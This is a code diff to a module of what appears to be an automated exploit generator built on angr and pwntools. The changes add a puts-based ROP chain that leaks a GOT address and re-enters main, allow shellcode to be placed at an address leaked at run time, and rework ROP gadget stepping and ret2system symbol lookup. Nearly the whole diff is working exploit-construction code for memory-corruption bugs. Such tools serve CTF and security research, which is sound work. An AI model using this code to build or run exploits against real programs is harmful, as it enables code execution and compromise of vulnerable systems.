@@ -2,7 +2,6 @@ import claripy
 from .radare_helper import findShellcode
 from pwn import *
 import timeout_decorator
-from zeratool import overflowExploitSender
 
 is_printable = False
 
@@ -49,6 +48,40 @@ def getShellcode(properties):
         shellcode = asm(assembly)
     return shellcode
 
+def get_leak_rop_chain(properties, leak_num=0):
+    context.binary = properties["file"]
+    elf = ELF(properties["file"])
+    rop = ROP(elf)
+
+    print_functions = ["puts"]
+    leak_function = list(elf.got)[leak_num]
+    print("Leaking {}".format(leak_function))
+
+    ret_func = None
+
+    # Find the function we want to call
+    # Just puts for right now
+    for function in print_functions:
+        print(function)
+        print(elf.plt)
+        if function in elf.symbols:
+            ret_func = elf.symbols[function]
+        elif function in elf.plt:
+            ret_func = elf.plt[function]
+    if ret_func is None:
+        raise RuntimeError("Cannot find symbol to return to")
+
+    # movabs
+    rop.raw(rop.ret.address)
+    rop.call(ret_func, [elf.got[leak_function]])
+    if "main" in elf.symbols: # Retrigger exploit
+        rop.call(elf.symbols['main'])
+    else:
+        print("No main symbol exposed, can't auto call")
+
+    print(rop.dump())
+
+    return rop.build()
 
 def get_rop_chain(properties):
     context.binary = properties["file"]
@@ -64,9 +97,9 @@ def get_rop_chain(properties):
     # Find the function we want to call
     for function in functions:
         if function in elf.symbols:
-            ret_func = elf.symbols["system"]
+            ret_func = elf.symbols[function]
         elif function in elf.plt:
-            ret_func = elf.plt["system"]
+            ret_func = elf.plt[function]
     else:
         raise RuntimeError("Cannot find symbol to return to")
 
@@ -190,6 +223,7 @@ def point_to_shellcode_filter(simgr):
     for state in simgr.unconstrained:
         properties = state.globals["properties"]
         shellcode = getShellcode(properties)
+        using_run_time_leak = False
 
         # Find potential addresses for shellcode
         addresses = [x for x in find_symbolic_buffer(state, len(shellcode))]
@@ -197,22 +231,22 @@ def point_to_shellcode_filter(simgr):
             list.sort(addresses)
 
         # Can we add a nop sled?
-        max_nop_count = 0
-        if addresses:
-            for x in range(0x50):
-                bigger_addrs = [
-                    x for x in find_symbolic_buffer(state, len(shellcode) + x)
-                ]
-                if bigger_addrs:
-                    addresses = bigger_addrs
-                    max_nop_count = x
-        if max_nop_count > 0:
-            print("Adding {} nops to shellcode".format(max_nop_count))
-            shellcode = b"\x90" * max_nop_count + shellcode
+        # max_nop_count = 0
+        # if addresses:
+        #     for x in range(0x50):
+        #         bigger_addrs = [
+        #             x for x in find_symbolic_buffer(state, len(shellcode) + x)
+        #         ]
+        #         if bigger_addrs:
+        #             addresses = bigger_addrs
+        #             max_nop_count = x
+        # if max_nop_count > 0:
+        #     print("Adding {} nops to shellcode".format(max_nop_count))
+        #     shellcode = b"\x90" * max_nop_count + shellcode
 
         # Build shellcode and check for bad chars
         avoidList = []
-        for address in addresses:
+        for i,address in enumerate(addresses):
             my_buf = state.memory.load(address, len(shellcode))
             if not state.satisfiable(extra_constraints=([my_buf == shellcode])):
                 print("[~] Shellcode can't be placed. Checking for bad bytes.")
@@ -257,6 +291,17 @@ def point_to_shellcode_filter(simgr):
             memory = state.memory.load(address, len(shellcode))
             shellcode_bvv = state.solver.BVV(shellcode)
 
+            if "leaked_type" in state.globals:
+                print("We have a leak, let's try and use that")
+                
+                # Either this is a call during a real run or
+                # we're still detecting
+                if "run_leak" in properties["pwn_type"]:
+                    address = properties["pwn_type"]["run_leak"]
+                    # Trust that this leak points to something good
+                    using_run_time_leak = True
+
+
             constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == address)
 
             # Check satisfiability
@@ -297,17 +342,17 @@ def point_to_shellcode_filter(simgr):
     return simgr
 
 
-"""
-This function just swaps out shellcode for ropchain.
-There has to be a better way to genericize this
-"""
-
-
 def point_to_ropchain_filter(simgr):
+
+    for state in simgr.active:
+        print(hex(state.solver.eval(state.regs.pc)))
 
     for state in simgr.unconstrained:
         properties = state.globals["properties"]
-        rop_chain = get_rop_chain(properties)
+        if state.globals["needs_leak"]:
+            rop_chain = get_leak_rop_chain(properties)
+        else:
+            rop_chain = get_rop_chain(properties)
 
         # my_buf = state.memory.load(address, len(rop_chain))
         # first_gadget = state.memory.load(address,pc_size)
@@ -315,7 +360,7 @@ def point_to_ropchain_filter(simgr):
         user_input = new_state.globals["user_input"]
 
         # Only amd64 right now
-        for gadget in rop_chain:
+        for i, gadget in enumerate(rop_chain):
             # Previous gadget set our symbolic value
             if new_state.regs.rdi.symbolic and new_state.satisfiable(
                 extra_constraints=([new_state.regs.rdi == gadget])
@@ -329,12 +374,25 @@ def point_to_ropchain_filter(simgr):
             ):
                 print("Setting PC to {}".format(hex(gadget)))
                 new_state.add_constraints(new_state.regs.pc == gadget)
-                new_state = new_state.step().all_successors[0]
+                if i == len(rop_chain)-1: # last gadget doesn't need to run
+                    print("Is last")
+                    break
+                rop_simgr = new_state.project.factory.simgr(new_state)
+                rop_simgr.explore() # Can't just step
+                new_state = rop_simgr.unconstrained[0]
             else:
                 print("not satis on {}".format(hex(gadget)))
                 break
 
         user_input = new_state.globals["user_input"]
+
+        #Need to re-exploit the program to use a leak
+        if new_state.globals["needs_leak"]:
+            new_state.globals["needs_leak"] = False
+            simgr.drop(stash="unconstrained")
+            simgr.drop(stash="active")
+            simgr.active.append(new_state)
+            break
 
         input_bytes = get_trimmed_input(user_input, new_state)
 
